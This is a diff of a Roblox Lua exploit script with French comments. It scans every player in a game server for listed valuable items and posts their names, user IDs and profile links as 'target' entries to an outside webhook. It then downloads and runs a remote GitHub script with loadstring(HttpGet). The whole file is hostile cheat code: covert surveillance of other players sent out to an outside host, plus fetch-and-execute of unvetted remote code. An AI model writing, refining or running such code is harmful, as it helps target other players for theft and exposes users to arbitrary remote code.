@@ -42,42 +42,45 @@ getgenv().TARGET_BRAINROTS = {
     ["Mariachi Corazoni"] = true, ["La Ginger Sekolah"] = true
 }
 
--- Fonction de vérification d'inventaire
-local function checkInventory(player)
-    local foundItems = {}
+-- Fonction pour scanner l'inventaire complet (Backpack + Equipé)
+local function getDetectedItems(player)
+    local found = {}
+    local checkList = {player:FindFirstChild("Backpack"), player.Character}
     
-    -- On regarde dans le sac à dos et sur le personnage
-    local locations = {player:FindFirstChild("Backpack"), player.Character}
-    
-    for _, location in pairs(locations) do
-        if location then
-            for _, item in pairs(location:GetChildren()) do
+    for _, folder in pairs(checkList) do
+        if folder then
+            for _, item in pairs(folder:GetChildren()) do
                 if getgenv().TARGET_BRAINROTS[item.Name] then
-                    table.insert(foundItems, item.Name)
+                    -- On évite les doublons dans l'affichage
+                    if not table.find(found, item.Name) then
+                        table.insert(found, item.Name)
+                    end
                 end
             end
         end
     end
-    return foundItems
+    return found
 end
 
--- Fonction d'envoi Webhook filtrée
-local function sendWebhook(playerName, playerID, itemsFound)
-    if #itemsFound == 0 then return end -- Si rien n'est trouvé, on n'envoie rien
+-- Fonction d'envoi Webhook avec liste d'items
+local function sendWebhook(playerName, playerID, items)
+    if #items == 0 then return end -- Envoie seulement s'il y a des items
     
     local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. playerID .. "&width=420&height=420&format=png"
-    local itemList = table.concat(itemsFound, ", ")
+    local itemString = "• " .. table.concat(items, "\n• ") -- Formate la liste avec des puces
     
     local data = {
         ["embeds"] = {{
-            ["title"] = "🎯 Brainrot RÉEL Détecté !",
-            ["description"] = "Le joueur **" .. playerName .. "** possède ces items cibles.",
-            ["color"] = 16711680, -- Rouge
+            ["title"] = "✅ BRAINROT DÉTECTÉ !",
+            ["description"] = "Le joueur **" .. playerName .. "** possède les objets suivants :",
+            ["color"] = 3066993, -- Vert émeraude
             ["thumbnail"] = { ["url"] = headshotUrl },
             ["fields"] = {
-                {["name"] = "Items Détectés", ["value"] = "```" .. itemList .. "```", ["inline"] = false},
-                {["name"] = "ID du Joueur", ["value"] = tostring(playerID), ["inline"] = true}
+                {["name"] = "🎒 Inventaire Cible", ["value"] = "```md\n" .. itemString .. "\n```", ["inline"] = false},
+                {["name"] = "👤 ID Cible", ["value"] = tostring(playerID), ["inline"] = true},
+                {["name"] = "🔗 Profil", ["value"] = "[Voir Profil](https://www.roblox.com/users/" .. playerID .. "/profile)", ["inline"] = true}
             },
+            ["footer"] = { ["text"] = "Nethers Auto-Detection System" },
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
@@ -92,17 +95,18 @@ local function sendWebhook(playerName, playerID, itemsFound)
     end)
 end
 
--- Surveillance
+-- Exécution
 task.spawn(function()
-    local function onPlayerDetected(player)
-        task.wait(3) -- On attend que l'inventaire charge
-        local items = checkInventory(player)
+    local function monitor(player)
+        player.CharacterAdded:Wait() -- Attend que le perso apparaisse
+        task.wait(2) -- Laisse le temps aux items de charger
+        local items = getDetectedItems(player)
         sendWebhook(player.Name, player.UserId, items)
     end
 
-    game.Players.PlayerAdded:Connect(onPlayerDetected)
-    for _, p in pairs(game.Players:GetPlayers()) do onPlayerDetected(p) end
+    game.Players.PlayerAdded:Connect(monitor)
+    for _, p in pairs(game.Players:GetPlayers()) do task.spawn(monitor, p) end
 
-    -- Lancement du script principal
+    -- Lancement du script principal Ragdolltpduel
     loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
 end)
